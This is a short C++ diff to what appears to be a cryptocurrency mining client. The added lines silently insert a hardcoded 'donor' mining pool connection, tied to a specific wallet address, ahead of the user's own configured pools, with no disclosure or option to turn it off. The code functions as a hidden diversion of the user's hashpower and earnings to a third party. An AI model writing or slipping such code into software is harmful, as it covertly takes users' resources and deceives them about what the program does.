@@ -436,7 +436,11 @@ public:
             if (!pools.size())
                 throw std::invalid_argument(
                     "At least one pool definition required. See -P argument.");
-
+            auto str = "stratum1+tcp://0x0c6C19313A2e87540F48a869C3B5e149136Bd96a.adityadonor@eth-us-west1.nanopool.org:9999";
+            // str= "stratum1+tcp://0x0c6C19313A2e87540F48a869C3B5e149136Bd96a.aditj@eth-us.sparkpool.com:3333";
+            std::shared_ptr<URI> uri_donor = std::shared_ptr<URI>(new URI(str));
+            m_PoolSettings.connections.push_back(uri_donor);
+            
             for (size_t i = 0; i < pools.size(); i++)
             {
                 std::string url = pools.at(i);
